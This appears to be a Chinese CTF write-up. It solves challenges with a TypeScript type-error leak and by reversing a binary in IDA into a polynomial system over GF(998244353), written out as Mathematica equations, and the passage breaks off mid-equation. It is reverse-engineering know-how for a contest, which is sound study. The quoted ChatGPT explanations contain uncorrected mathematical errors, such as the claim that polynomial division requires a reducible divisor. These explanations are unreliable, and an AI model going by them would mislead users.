<script>navigator.serviceWorker.register('/kannkanndahjiba/', { scope: '/' });</script>
```
接下来就来看大几把了啊嗯。

简单的打字稿
Super Easy
我让 ChatGPT 写了个把 String literal type 拆分的代码，然后稍加修改：
```
type Split<S extends string, D extends string> = string extends S ? string[] : S extends '' ? [] : S extends `${infer T}${D}${infer U}` ? [...Split<U, D>] : [S];
type ikuzo = Split<flag1, 'flag'>;
let x: ikuzo = ['1919810'];
```
于是它非常顺利地报错了：
```
[+] Stderr:
Check file:///app/$deno$stdin.ts
error: TS2322 [ERROR]: Type '"1919810"' is not assignable to type '"{TOo0_e4sY_f1aG_foR_Tooo_easy_LANg}"'.
let x: ikuzo = ['1919810'];
                ~~~~~~~~~
    at file:///app/$deno$stdin.ts:6:17
```

小章鱼的曲奇
SUPA BIG Cookie……我瞎猫撞死耗子，把它吐出来的第一个数直接喂回去，居然蒙混过关了。

绝妙的多项式
「ChatGPT 或许能帮你辨认出小 Y 给的信息。」
那就问 ChatGPT 呗。
```
小Y是一个计算机系的同学，但是非常不幸的是他需要上很多的数学专业课。
某一天，他正看着书上一堆式子发呆的时候，突然灵光一闪，想到几个绝妙的多项式。
他想考考你能不能猜出多项式是多少？
当然大家都不会读心术，小Y给了一些信息
提示：
如何在 Zp 空间中进行除法，对多项式是否有类似的方法？
```
```
小Y提出的问题是一个很有趣的挑战。在数学和计算机科学中，Zp（有时也写作Z/pZ）通常指的是模p的整数环，其中p是一个素数。在这个环中，你可以进行加法、减法和乘法，但不能直接进行除法，因为不是所有元素都有乘法逆元。但是，如果你要除以一个与p互质的数（即，最大公约数为1），那么可以找到一个乘法逆元，从而实现除法。
现在，关于多项式的问题，我们需要考虑的是在一个类似于Zp的结构中的多项式环，通常表示为Zp[x]，其中的元素是系数在Zp中的多项式。在这个环中，我们也可以进行加法、减法和乘法。至于除法，情况就比较复杂了。
1. 首先，如果我们谈论的是在Zp[x]中除以一个常数，那么只要这个常数在Zp中有逆元，我们就可以把每个系数都除以这个常数。这是因为多项式环的每个系数都遵循Zp的规则。
2. 如果我们要在Zp[x]中除以一个多项式，情况就更加复杂。这种除法（实际上是“多项式的除法算法”）通常会涉及找到商多项式和余数多项式，就像在实数中的长除法一样。但是，这只有在除数多项式是可约的（即，不能分解为更小的多项式）并且其最高次系数有逆元时才有可能。
总的来说，能否进行除法以及如何进行，取决于具体你要除以什么。小Y可能已经考虑到了在Zp[x]中的多项式除法的复杂性，并想通过这个问题来考验你对这个主题的理解。不过，要精确猜出他心中的多项式是什么，我们可能需要更多的信息或者一些特定的条件或规则，因为在Zp[x]中可能有无限多个多项式。
```
当然我作为一个数学人（自认为）而非计算机人，视角自然还是着重于它的代数结构（我之前就说过想补补有限域理论！）：
```
其实 Zp 就是循环群 GF，对吗？
```
```
对的，你说得很对。Zp 是一个循环群，它在加法运算下是循环的。Zp 是由元素0, 1, 2, ..., p-1组成（其中p为素数），并在模p的加法运算上形成循环群，称为加法群。
如果我们考虑非零元素的乘法，将得出一个有p-1个元素的乘法群。也就是非零元素1, 2, ..., p-1在模p的乘法运算下同样形成一个循环群。换句话说，你可以找到一个元素，通过不断地自我乘法，可以生成整个群的所有元素。
这样的乘法群也被称为有限域或伽罗华域（Galois Field），记作GF(p)。然而，强调一点，当p为素数时，Zp和GF(p)在加法和乘法的运算规则上事实上是相同的。但在更广泛的意义上，有限域GF(p^n) (n>1) 还包括了由p^n个元素组成的结构，这时我们就需要考虑多项式的运算了。
```
```
至少我知道整数 n 在素有限域 GF(p) 中的乘法逆元是 n^(p-2)，没错吧？
```
```
是的，你是对的！在素数有限域 \( GF(p) \) 中，费马小定理（Fermat's Little Theorem）告诉我们，如果 \( n \) 是一个与 \( p \) 互质的整数（即 \( n \) 不是 \( p \) 的倍数），那么：
\[ n^{p-1} \equiv 1 \mod p \]
从上式我们可以得出，\( n \times n^{p-2} \equiv 1 \mod p \)。这意味着，\( n^{p-2} \) 是 \( n \) 在 \( GF(p) \) 中的乘法逆元。
因此，如果你想在 \( GF(p) \) 中计算 \( n \) 的乘法逆元，你只需计算 \( n^{p-2} \) mod \( p \) 即可。这是一个非常有用的性质，特别是在密码学和编码理论中。
```
```
但是对于多项式来说，是否还有甚么值得注意的点？
```
```
对于有限域 \(GF(p)[x]\) 中的多项式来说，也存在一些有趣和重要的点。以下是一些值得注意的关键点：
1. **单位多项式**：在有限域 \(GF(p)\) 中，数字 1 是单位元素，即对任何元素 \(a\)，都有 \(1 \times a = a\). 同样，在多项式环 \(GF(p)[x]\) 中，常数多项式 1 也是单位元素。
2. **多项式乘法的逆元**：不是所有多项式都有乘法逆元。只有那些次数为0的多项式（即常数非零多项式）才可能有乘法逆元。对于这些多项式，它们在 \(GF(p)\) 中的逆元也是它们在 \(GF(p)[x]\) 中的逆元。
3. **多项式除法**：在多项式环中，我们可以使用**多项式的长除法**来除以另一个多项式。这与我们在小学学到的数字长除法非常相似。结果会得到一个商和余数。
4. **不可约多项式**：在有限域 \(GF(p)[x]\) 中，不可约多项式扮演了类似于整数中的素数的角色。一个多项式在 \(GF(p)[x]\) 中是不可约的，意味着它不能被分解为两个非常数多项式的乘积。
5. **多项式的因式分解**：类似于整数的因式分解，多项式也可以分解为不可约多项式的乘积。这个因式分解在给定的有限域中是唯一的（忽略因子的顺序）。
6. **多项式的求根**：给定一个多项式 \(f(x)\) 和一个有限域 \(GF(p)\)，我们可以寻找该多项式在该域中的根，也就是使 \(f(x) = 0\) 的值。
7. **有限域的扩展**：\(GF(p^n)\) 是一个包含 \(p^n\) 个元素的有限域，并且可以被看作是由 \(GF(p)\) 上的多项式构造出来的，其中多项式的次数小于 \(n\)。其中，\(GF(p^n)\) 的一个重要性质是它可以由一个不可约的 \(n\) 次多项式生成。
这些是与 \(GF(p)[x]\) 相关的一些关键概念和性质。理解这些性质对于深入研究有限域和与之相关的领域（如密码学、编码理论和数论）是非常有益的。
```
```
我想我需要解决的恰恰就是多项式的求根问题，因为我事实上持有一组 GF(998244353) 下的多项式方程组（尽管我现在还不知道它的具体系数，它是用计算机程序代码生成的）——问题就在于如何求出这个方程组的解。
```
```
在有限域`GF(p)`中求解多项式方程的问题往往依赖于具体的多项式和有限域。另外，在特定的应用中使用数值方法，如Newton法，或是用一个已知的解或猜测的解来进行逐步迭代，也很有可能会得出所有的解。 
对于有限域`GF(998244353)`（注意`998244353`是一个非常大的素数），解决多项式方程可能需要更为高级的数学技巧，特别是当方程的次数增加时。对于程序员来说，可能需要将这个问题切分为更小的子问题，然后针对每个特定问题设计或选择合适的算法。
如果你的多项式方程组是用计算机程序生成的，那么你可能可以利用生成这个方程组时使用的信息或结构来帮助求解。例如，如果你的程序生成的多项式有某种特定的结构（如只包含特定次数的项，或者所有的多项式都有某种相互关联的关系），那么可能有更有效的方法来求解这些方程组。
总体来说，解决你的问题可能需要一些独立的研究和深入的学习。这是一个非常有吸引力和挑战性的问题，当然也需要一个深入的理解有限域和多项式方程的基础知识。如果遇到困难的话，不要气馁，解决这类问题通常需要时间和耐心。有时候，与导师或专业的同伴探讨，或者搜索相关的文献资料也会有所帮助。
```
……该死，我抽象代数忘得差不多了，数论更是一点不会。可是以上内容我一开始就都知道啊，这不是一点用都没有吗，，、
第一阶段大致判断出 mint 就是在有限域 GF(998244353) 作运算这点，可我实在没有别的头绪了。
没办法，只好硬着头皮看。
IDA，启动！
Flag 1 对应的是 sub_1803，要输入的是长为 36 的字符串。
dword_5020 位于档案的 0x4020 处，长达 144 字节，应该是按 UInt32 存储的多项式在一些情形的值。
其中 IDA 给出的伪代码是这样的：
```
    for ( j = 1; j <= v14; ++j )
    {
      v8 = 0;
      v9 = 1;
      for ( k = 0; k < v14; ++k )
      {
        v4 = mint::operator*((char *)s + 4 * k, v9);
        mint::operator+=(&v8, v4);
        mint::mint((mint *)&v10, j);
        mint::operator*=(&v9, v10);
      }
      if ( v8 != dword_5020[j - 1] )
      {
        v5 = std::operator<<<std::char_traits<char>>(&std::cout, "Failed, please try again!");
        std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
        v2 = 1;
        goto LABEL_15;
      }
    }
```
我在第一阶段就被这几层循环吓怕了。其实，把这段伪代码整理一下，大概是这样的意思：
```
let j = 1;
while (j <= 36) {
    let x = 0;
    let y = 1;

    let k = 0;
    while (k < 36) {
        x += str[k] * y;
        y *= j;
        k += 1;
    };

    if (x !== dword_5020[j - 1]) {
        console.log('不对哟！');
        break;
    };

    j += 1;
};
```
稍微改改变成输出数学表达式字符串的程式，然后丢去 Node.js 跑跑。我还真观察出了点东西。
所以说这个方程组的真相其实是……
sum{i=0→35}(str[i] x^i) = dword_5020[x]（其中 x∈Z∩[1, 36]）
36 个未知数，36 个方程，解这个方程组就完事了。
它根本就不那么可怕嘛！只是我就被伪代码那一串复杂的函数名吓退了。
原来，字符就是项的系数，它的位置就是项的幂次！
非常喜欢 Ishisashi 的一句话：「啊？」
代码看上去这么吓人，写成数学表达式就这么简单，赔钱！
可惜上课耽误了我做题的时间，一下课我就赶紧（恨不得以光速！）跑回宿舍，然后……
Mathematica，启动！
```
Solve[{str0 * 1 + str1 * 1 + str2 * 1 + str3 * 1 + str4 * 1 + str5 * 1 + str6 * 1 + str7 * 1 + str8 * 1 + str9 * 1 + str10 * 1 + str11 * 1 + str12 * 1 + str13 * 1 + str14 * 1 + str15 * 1 + str16 * 1 + str17 * 1 + str18 * 1 + str19 * 1 + str20 * 1 + str21 * 1 + str22 * 1 + str23 * 1 + str24 * 1 + str25 * 1 + str26 * 1 + str27 * 1 + str28 * 1 + str29 * 1 + str30 * 1 + str31 * 1 + str32 * 1 + str33 * 1 + str34 * 1 + str35 * 1  == 3318, str0 * 1 + str1 * 2 + str2 * 4 + str3 * 8 + str4 * 16 + str5 * 32 + str6 * 64 + str7 * 128 + str8 * 256 + str9 * 512 + str10 * 1024 + str11 * 2048 + str12 * 4096 + str13 * 8192 + str14 * 16384 + str15 * 32768 + str16 * 65536 + str17 * 131072 + str18 * 262144 + str19 * 524288 + str20 * 1048576 + str21 * 2097152 + str22 * 4194304 + str23 * 8388608 + str24 * 16777216 + str25 * 33554432 + str26 * 67108864 + str27 * 134217728 + str28 * 268435456 + str29 * 536870912 + str30 * 1073741824 + str31 * 2147483648 + str32 * 4294967296 + str33 * 8589934592 + str34 * 17179869184 + str35 * 34359738368  == 382207753, str0 * 1 + str1 * 3 + str2 * 9 + str3 * 27 + str4 * 81 + str5 * 243 + str6 * 729 + str7 * 2187 + str8 * 6561 + str9 * 19683 + str10 * 59049 + str11 * 177147 + str12 * 531441 + str13 * 1594323 + str14 * 4782969 + str15 * 14348907 + str16 * 43046721 + str17 * 129140163 + str18 * 387420489 + str19 * 1162261467 + str20 * 3486784401 + str21 * 10460353203 + str22 * 31381059609 + str23 * 94143178827 + str24 * 282429536481 + str25 * 847288609443 + str26 * 2541865828329 + str27 * 7625597484987 + str28 * 22876792454961 + str29 * 68630377364883 + str30 * 205891132094649 + str31 * 617673396283947 + str32 * 1853020188851841 + str33 * 5559060566555523 + str34 * 16677181699666569 + str35 * 50031545098999707  == 141261786, str0 * 1 + str1 * 4 + str2 * 16 + str3 * 64 + str4 * 256 + str5 * 1024 + str6 * 4096 + str7 * 16384 + str8 * 65536 + str9 * 262144 + str10 * 1048576 + str11 * 4194304 + str12 * 16777216 + str13 * 67108864 + str14 * 268435456 + str15 * 1073741824 + str16 * 4294967296 + str17 * 17179869184 + str18 * 68719476736 + str19 * 274877906944 + str20 * 1099511627776 + str21 * 4398046511104 + str22 * 17592186044416 + str23 * 70368744177664 + str24 * 281474976710656 + str25 * 1125899906842624 + str26 * 4503599627370496 + str27 * 18014398509481984 + str28 * 72057594037927936 + str29 * 288230376151711744 + str30 * 1152921504606846976 + str31 * 4611686018427387904 + str32 * 18446744073709551616 + str33 * 73786976294838206464 + str34 * 295147905179352825856 + str35 * 1180591620717411303424  == 100396702, str0 * 1 + str1 * 5 + str2 * 25 + str3 * 125 + str4 * 625 + str5 * 3125 + str6 * 15625 + str7 * 78125 + str8 * 390625 + str9 * 1953125 + str10 * 9765625 + str11 * 48828125 + str12 * 244140625 + str13 * 1220703125 + str14 * 6103515625 + str15 * 30517578125 + str16 * 152587890625 + str17 * 762939453125 + str18 * 3814697265625 + str19 * 19073486328125 + str20 * 95367431640625 + str21 * 476837158203125 + str22 * 2384185791015625 + str23 * 11920928955078125 + str24 * 59604644775390625 + str25 * 298023223876953125 + str26 * 1490116119384765625 + str27 * 7450580596923828125 + str28 * 37252902984619140625 + str29 * 186264514923095703125 + str30 * 931322574615478515625 + str31 * 4656612873077392578125 + str32 * 23283064365386962890625 + str33 * 116415321826934814453125 + str34 * 582076609134674072265625 + str35 * 2910383045673370361328125  == 617742273, str0 * 1 + str1 * 6 + str2 * 36 + str3 * 216 + str4 * 1296 + str5 * 7776 + str6 * 46656 + str7 * 279936 + str8 * 1679616 + str9 * 10077696 + str10 * 60466176 + str11 * 362797056 + str12 * 2176782336 + str13 * 13060694016 + str14 * 78364164096 + str15 * 470184984576 + str16 * 2821109907456 + str17 * 16926659444736 + str18 * 101559956668416 + str19 * 609359740010496 + str20 * 3656158440062976 + str21 * 21936950640377856 + str22 * 131621703842267136 + str23 * 789730223053602816 + str24 * 4738381338321616896 + str25 * 28430288029929701376 + str26 * 170581728179578208256 + str27 * 1023490369077469249536 + str28 * 6140942214464815497216 + str29 * 36845653286788892983296 + str30 * 221073919720733357899776 + str31 * 1326443518324400147398656 + str32 * 7958661109946400884391936 + str33 * 47751966659678405306351616 + str34 * 286511799958070431838109696 + str35 * 1719070799748422591028658176  == 385313506, str0 * 1 + str1 * 7 + str2 * 49 + str3 * 343 + str4 * 2401 + str5 * 16807 + str6 * 117649 + str7 * 823543 + str8 * 5764801 + str9 * 40353607 + str10 * 282475249 + str11 * 1977326743 + str12 * 13841287201 + str13 * 96889010407 + str14 * 678223072849 + str15 * 4747561509943 + str16 * 33232930569601 + str17 * 232630513987207 + str18 * 1628413597910449 + str19 * 11398895185373143 + str20 * 79792266297612001 + str21 * 558545864083284007 + str22 * 3909821048582988049 + str23 * 27368747340080916343 + str24 * 191581231380566414401 + str25 * 1341068619663964900807 + str26 * 9387480337647754305649 + str27 * 65712362363534280139543 + str28 * 459986536544739960976801 + str29 * 3219905755813179726837607 + str30 * 22539340290692258087863249 + str31 * 157775382034845806615042743 + str32 * 1104427674243920646305299201 + str33 * 7730993719707444524137094407 + str34 * 54116956037952111668959660849 + str35 * 378818692265664781682717625943  == 368063237, str0 * 1 + str1 * 8 + str2 * 64 + str3 * 512 + str4 * 4096 + str5 * 32768 + str6 * 262144 + str7 * 2097152 + str8 * 16777216 + str9 * 134217728 + str10 * 1073741824 + str11 * 8589934592 + str12 * 68719476736 + str13 * 549755813888 + str14 * 4398046511104 + str15 * 35184372088832 + str16 * 281474976710656 + str17 * 2251799813685248 + str18 * 18014398509481984 + str19 * 144115188075855872 + str20 * 1152921504606846976 + str21 * 9223372036854775808 + str22 * 73786976294838206464 + str23 * 590295810358705651712 + str24 * 4722366482869645213696 + str25 * 37778931862957161709568 + str26 * 302231454903657293676544 + str27 * 2417851639229258349412352 + str28 * 19342813113834066795298816 + str29 * 154742504910672534362390528 + str30 * 1237940039285380274899124224 + str31 * 9903520314283042199192993792 + str32 * 79228162514264337593543950336 + str33 * 633825300114114700748351602688 + str34 * 5070602400912917605986812821504 + str35 * 40564819207303340847894502572032  == 562832377, str0 * 1 + str1 * 9 + str2 * 81 + str3 * 729 + str4 * 6561 + str5 * 59049 + str6 * 531441 + str7 * 4782969 + str8 * 43046721 + str9 * 387420489 + str10 * 3486784401 + str11 * 31381059609 + str12 * 282429536481 + str13 * 2541865828329 + str14 * 22876792454961 + str15 * 205891132094649 + str16 * 1853020188851841 + str17 * 16677181699666569 + str18 * 150094635296999121 + str19 * 1350851717672992089 + str20 * 12157665459056928801 + str21 * 109418989131512359209 + str22 * 984770902183611232881 + str23 * 8862938119652501095929 + str24 * 79766443076872509863361 + str25 * 717897987691852588770249 + str26 * 6461081889226673298932241 + str27 * 58149737003040059690390169 + str28 * 523347633027360537213511521 + str29 * 4710128697246244834921603689 + str30 * 42391158275216203514294433201 + str31 * 381520424476945831628649898809 + str32 * 3433683820292512484657849089281 + str33 * 30903154382632612361920641803529 + str34 * 278128389443693511257285776231761 + str35 * 2503155504993241601315571986085849  == 857094849, str0 * 1 + str1 * 10 + str2 * 100 + str3 * 1000 + str4 * 10000 + str5 * 100000 + str6 * 1000000 + str7 * 10000000 + str8 * 100000000 + str9 * 1000000000 + str10 * 10000000000 + str11 * 100000000000 + str12 * 1000000000000 + str13 * 10000000000000 + str14 * 100000000000000 + str15 * 1000000000000000 + str16 * 10000000000000000 + str17 * 100000000000000000 + str18 * 1000000000000000000 + str19 * 10000000000000000000 + str20 * 100000000000000000000 + str21 * 1000000000000000000000 + str22 * 10000000000000000000000 + str23 * 100000000000000000000000 + str24 * 1000000000000000000000000 + str25 * 10000000000000000000000000 + str26 * 100000000000000000000000000 + str27 * 1000000000000000000000000000 + str28 * 10000000000000000000000000000 + str29 * 100000000000000000000000000000 + str30 * 1000000000000000000000000000000 + str31 * 10000000000000000000000000000000 + str32 * 100000000000000000000000000000000 + str33 * 1000000000000000000000000000000000 + str34 * 10000000000000000000000000000000000 + str35 * 100000000000000000000000000000000000  == 53657966, str0 * 1 + str1 * 11 + str2 * 121 + str3 * 1331 + str4 * 14641 + str5 * 161051 + str6 * 1771561 + str7 * 19487171 + str8 * 214358881 + str9 * 2357947691 + str10 * 25937424601 + str11 * 285311670611 + str12 * 3138428376721 + str13 * 34522712143931 + str14 * 379749833583241 + str15 * 4177248169415651 + str16 * 45949729863572161 + str17 * 505447028499293771 + str18 * 5559917313492231481 + str19 * 61159090448414546291 + str20 * 672749994932560009201 + str21 * 7400249944258160101211 + str22 * 81402749386839761113321 + str23 * 895430243255237372246531 + str24 * 9849732675807611094711841 + str25 * 108347059433883722041830251 + str26 * 1191817653772720942460132761 + str27 * 13109994191499930367061460371 + str28 * 144209936106499234037676064081 + str29 * 1586309297171491574414436704891 + str30 * 17449402268886407318558803753801 + str31 * 191943424957750480504146841291811 + str32 * 2111377674535255285545615254209921 + str33 * 23225154419887808141001767796309131 + str34 * 255476698618765889551019445759400441 + str35 * 2810243684806424785061213903353404851  == 669496487, str0 * 1 + str1 * 12 + str2 * 144 + str3 * 1728 + str4 * 20736 + str5 * 248832 + str6 * 2985984 + str7 * 35831808 + str8 * 429981696 + str9 * 5159780352 + str10 * 61917364224 + str11 * 743008370688 + str12 * 8916100448256 + str13 * 106993205379072 + str14 * 1283918464548864 + str15 * 15407021574586368 + str16 * 184884258895036416 + str17 * 2218611106740436992 + str18 * 26623333280885243904 + str19 * 319479999370622926848 + str20 * 3833759992447475122176 + str21 * 46005119909369701466112 + str22 * 552061438912436417593344 + str23 * 6624737266949237011120128 + str24 * 79496847203390844133441536 + str25 * 953962166440690129601298432 + str26 * 11447545997288281555215581184 + str27 * 137370551967459378662586974208 + str28 * 1648446623609512543951043690496 + str29 * 19781359483314150527412524285952 + str30 * 237376313799769806328950291431424 + str31 * 2848515765597237675947403497177088 + str32 * 34182189187166852111368841966125056 + str33 * 410186270246002225336426103593500672 + str34 * 4922235242952026704037113243122008064 + str35 * 59066822915424320448445358917464096768  == 605913203, str0 * 1 + str1 * 13 + str2 * 169 + str3 * 2197 + str4 * 28561 + str5 * 371293 + str6 * 4826809 + str7 * 62748517 + str8 * 815730721 + str9 * 10604499373 + str10 * 137858491849 + str11 * 1792160394037 + str12 * 23298085122481 + str13 * 302875106592253 + str14 * 3937376385699289 + str15 * 51185893014090757 + str16 * 665416609183179841 + str17 * 8650415919381337933 + str18 * 112455406951957393129 + str19 * 1461920290375446110677 + str20 * 19004963774880799438801 + str21 * 247064529073450392704413 + str22 * 3211838877954855105157369 + str23 * 41753905413413116367045797 + str24 * 542800770374370512771595361 + str25 * 7056410014866816666030739693 + str26 * 91733330193268616658399616009 + str27 * 1192533292512492016559195008117 + str28 * 15502932802662396215269535105521 + str29 * 201538126434611150798503956371773 + str30 * 2619995643649944960380551432833049 + str31 * 34059943367449284484947168626829637 + str32 * 442779263776840698304313192148785281 + str33 * 5756130429098929077956071497934208653 + str34 * 74829695578286078013428929473144712489 + str35 * 972786042517719014174576083150881262357  == 29815074, str0 * 1 + str1 * 14 + str2 * 196 + str3 * 2744 + str4 * 38416 + str5 * 537824 + str6 * 7529536 + str7 * 105413504 + str8 * 1475789056 + str9 * 20661046784 + str10 * 289254654976 + str11 * 4049565169664 + str12 * 56693912375296 + str13 * 793714773254144 + str14 * 11112006825558016 + str15 * 155568095557812224 + str16 * 2177953337809371136 + str17 * 30491346729331195904 + str18 * 426878854210636742656 + str19 * 5976303958948914397184 + str20 * 83668255425284801560576 + str21 * 1171355575953987221848064 + str22 * 16398978063355821105872896 + str23 * 229585692886981495482220544 + str24 * 3214199700417740936751087616 + str25 * 44998795805848373114515226624 + str26 * 629983141281877223603213172736 + str27 * 8819763977946281130444984418304 + str28 * 123476695691247935826229781856256 + str29 * 1728673739677471101567216945987584 + str30 * 24201432355484595421941037243826176 + str31 * 338820052976784335907174521413566464 + str32 * 4743480741674980702700443299789930496 + str33 * 66408730383449729837806206197059026944 + str34 * 929722225368296217729286886758826377216 + str35 * 13016111155156147048210016414623569281024  == 762568211, str0 * 1 + str1 * 15 + str2 * 225 + str3 * 3375 + str4 * 50625 + str5 * 759375 + str6 * 11390625 + str7 * 170859375 + str8 * 2562890625 + str9 * 38443359375 + str10 * 576650390625 + str11 * 8649755859375 + str12 * 129746337890625 + str13 * 1946195068359375 + str14 * 29192926025390625 + str15 * 437893890380859375 + str16 * 6568408355712890625 + str17 * 98526125335693359375 + str18 * 1477891880035400390625 + str19 * 22168378200531005859375 + str20 * 332525673007965087890625 + str21 * 4987885095119476318359375 + str22 * 74818276426792144775390625 + str23 * 1122274146401882171630859375 + str24 * 16834112196028232574462890625 + str25 * 252511682940423488616943359375 + str26 * 3787675244106352329254150390625 + str27 * 56815128661595284938812255859375 + str28 * 852226929923929274082183837890625 + str29 * 12783403948858939111232757568359375 + str30 * 191751059232884086668491363525390625 + str31 * 2876265888493261300027370452880859375 + str32 * 43143988327398919500410556793212890625 + str33 * 647159824910983792506158351898193359375 + str34 * 9707397373664756887592375278472900390625 + str35 * 145610960604971353313885629177093505859375  == 133958153, str0 * 1 + str1 * 16 + str2 * 256 + str3 * 4096 + str4 * 65536 + str5 * 1048576 + str6 * 16777216 + str7 * 268435456 + str8 * 4294967296 + str9 * 68719476736 + str10 * 1099511627776 + str11 * 17592186044416 + str12 * 281474976710656 + str13 * 4503599627370496 + str14 * 72057594037927936 + str15 * 1152921504606846976 + str16 * 18446744073709551616 + str17 * 295147905179352825856 + str18 * 4722366482869645213696 + str19 * 75557863725914323419136 + str20 * 1208925819614629174706176 + str21 * 19342813113834066795298816 + str22 * 309485009821345068724781056 + str23 * 4951760157141521099596496896 + str24 * 79228162514264337593543950336 + str25 * 1267650600228229401496703205376 + str26 * 20282409603651670423947251286016 + str27 * 324518553658426726783156020576256 + str28 * 5192296858534827628530496329220096 + str29 * 83076749736557242056487941267521536 + str30 * 1329227995784915872903807060280344576 + str31 * 21267647932558653966460912964485513216 + str32 * 340282366920938463463374607431768211456 + str33 * 5444517870735015415413993718908291383296 + str34 * 87112285931760246646623899502532662132736 + str35 * 1393796574908163946345982392040522594123776  == 223410103, str0 * 1 + str1 * 17 + str2 * 289 + str3 * 4913 + str4 * 83521 + str5 * 1419857 + str6 * 24137569 + str7 * 410338673 + str8 * 6975757441 + str9 * 118587876497 + str10 * 2015993900449 + str11 * 34271896307633 + str12 * 582622237229761 + str13 * 9904578032905937 + str14 * 168377826559400929 + str15 * 2862423051509815793 + str16 * 48661191875666868481 + str17 * 827240261886336764177 + str18 * 14063084452067724991009 + str19 * 239072435685151324847153 + str20 * 4064231406647572522401601 + str21 * 69091933913008732880827217 + str22 * 1174562876521148458974062689 + str23 * 19967568900859523802559065713 + str24 * 339448671314611904643504117121 + str25 * 5770627412348402378939569991057 + str26 * 98100666009922840441972689847969 + str27 * 1667711322168688287513535727415473 + str28 * 28351092476867700887730107366063041 + str29 * 481968572106750915091411825223071697 + str30 * 8193465725814765556554001028792218849 + str31 * 139288917338851014461418017489467720433 + str32 * 2367911594760467245844106297320951247361 + str33 * 40254497110927943179349807054456171205137 + str34 * 684326450885775034048946719925754910487329 + str35 * 11633549665058175578832094238737833478284593  == 39956957, str0 * 1 + str1 * 18 + str2 * 324 + str3 * 5832 + str4 * 104976 + str5 * 1889568 + str6 * 34012224 + str7 * 612220032 + str8 * 11019960576 + str9 * 198359290368 + str10 * 3570467226624 + str11 * 64268410079232 + str12 * 1156831381426176 + str13 * 20822964865671168 + str14 * 374813367582081024 + str15 * 6746640616477458432 + str16 * 121439531096594251776 + str17 * 2185911559738696531968 + str18 * 39346408075296537575424 + str19 * 708235345355337676357632 + str20 * 12748236216396078174437376 + str21 * 229468251895129407139872768 + str22 * 4130428534112329328517709824 + str23 * 74347713614021927913318776832 + str24 * 1338258845052394702439737982976 + str25 * 24088659210943104643915283693568 + str26 * 433595865796975883590475106484224 + str27 * 7804725584345565904628551916716032 + str28 * 140485060518220186283313934500888576 + str29 * 2528731089327963353099650821015994368 + str30 * 45517159607903340355793714778287898624 + str31 * 819308872942260126404286866009182175232 + str32 * 14747559712960682275277163588165279154176 + str33 * 265456074833292280954988944586975024775168 + str34 * 4778209346999261057189801002565550445953024 + str35 * 86007768245986699029416418046179908027154432  == 937802638, str0 * 1 + str1 * 19 + str2 * 361 + str3 * 6859 + str4 * 130321 + str5 * 2476099 + str6 * 47045881 + str7 * 893871739 + str8 * 16983563041 + str9 * 322687697779 + str10 * 6131066257801 + str11 * 116490258898219 + str12 * 2213314919066161 + str13 * 42052983462257059 + str14 * 799006685782884121 + str15 * 15181127029874798299 + str16 * 288441413567621167681 + str17 * 5480386857784802185939 + str18 * 104127350297911241532841 + str19 * 1978419655660313589123979 + str20 * 37589973457545958193355601 + str21 * 714209495693373205673756419 + str22 * 13569980418174090907801371961 + str23 * 257829627945307727248226067259 + str24 * 4898762930960846817716295277921 + str25 * 93076495688256089536609610280499 + str26 * 1768453418076865701195582595329481 + str27 * 33600614943460448322716069311260139 + str28 * 638411683925748518131605316913942641 + str29 * 12129821994589221844500501021364910179 + str30 * 230466617897195215045509519405933293401 + str31 * 4378865740046709085864680868712732574619 + str32 * 83198449060887472631428936505541918917761 + str33 * 1580770532156861979997149793605296459437459 + str34 * 30034640110980377619945846078500632729311721 + str35 * 570658162108627174778971075491512021856922699  == 229055941, str0 * 1 + str1 * 20 + str2 * 400 + str3 * 8000 + str4 * 160000 + str5 * 3200000 + str6 * 64000000 + str7 * 1280000000 + str8 * 25600000000 + str9 * 512000000000 + str10 * 10240000000000 + str11 * 204800000000000 + str12 * 4096000000000000 + str13 * 81920000000000000 + str14 * 1638400000000000000 + str15 * 32768000000000000000 + str16 * 655360000000000000000 + str17 * 13107200000000000000000 + str18 * 262144000000000000000000 + str19 * 5242880000000000000000000 + str20 * 104857600000000000000000000 + str21 * 2097152000000000000000000000 + str22 * 41943040000000000000000000000 + str23 * 838860800000000000000000000000 + str24 * 16777216000000000000000000000000 + str25 * 335544320000000000000000000000000 + str26 * 6710886400000000000000000000000000 + str27 * 134217728000000000000000000000000000 + str28 * 2684354560000000000000000000000000000 + str29 * 53687091200000000000000000000000000000 + str30 * 1073741824000000000000000000000000000000 + str31 * 21474836480000000000000000000000000000000 + str32 * 429496729600000000000000000000000000000000 + str33 * 8589934592000000000000000000000000000000000 + str34 * 171798691840000000000000000000000000000000000 + str35 * 3435973836800000000000000000000000000000000000  == 767816204, str0 * 1 + str1 * 21 + str2 * 441 + str3 * 9261 + str4 * 194481 + str5 * 4084101 + str6 * 85766121 + str7 * 1801088541 + str8 * 37822859361 + str9 * 794280046581 + str10 * 16679880978201 + str11 * 350277500542221 + str12 * 7355827511386641 + str13 * 154472377739119461 + str14 * 3243919932521508681 + str15 * 68122318582951682301 + str16 * 1430568690241985328321 + str17 * 30041942495081691894741 + str18 * 630880792396715529789561 + str19 * 13248496640331026125580781 + str20 * 278218429446951548637196401 + str21 * 5842587018385982521381124421 + str22 * 122694327386105632949003612841 + str23 * 2576580875108218291929075869661 + str24 * 54108198377272584130510593262881 + str25 * 1136272165922724266740722458520501 + str26 * 23861715484377209601555171628930521 + str27 * 501096025171921401632658604207540941 + str28 * 10523016528610349434285830688358359761 + str29 * 220983347100817338120002444455525554981 + str30 * 4640650289117164100520051333566036654601 + str31 * 97453656071460446110921078004886769746621 + str32 * 2046526777500669368329342638102622164679041 + str33 * 42977062327514056734916195400155065458259861 + str34 * 902518308877795191433240103403256374623457081 + str35 * 18952884486433699020098042171468383867092598701  == 13414714, str0 * 1 + str1 * 22 + str2 * 484 + str3 * 10648 + str4 * 234256 + str5 * 5153632 + str6 * 113379904 + str7 * 2494357888 + str8 * 54875873536 + str9 * 1207269217792 + str10 * 26559922791424 + str11 * 584318301411328 + str12 * 12855002631049216 + str13 * 282810057883082752 + str14 * 6221821273427820544 + str15 * 136880068015412051968 + str16 * 3011361496339065143296 + str17 * 66249952919459433152512 + str18 * 1457498964228107529355264 + str19 * 32064977213018365645815808 + str20 * 705429498686404044207947776 + str21 * 15519448971100888972574851072 + str22 * 341427877364219557396646723584 + str23 * 7511413302012830262726227918848 + str24 * 165251092644282265779977014214656 + str25 * 3635524038174209847159494312722432 + str26 * 79981528839832616637508874879893504 + str27 * 1759593634476317566025195247357657088 + str28 * 38711059958478986452554295441868455936 + str29 * 851643319086537701956194499721106030592 + str30 * 18736153019903829443036278993864332673024 + str31 * 412195366437884247746798137865015318806528 + 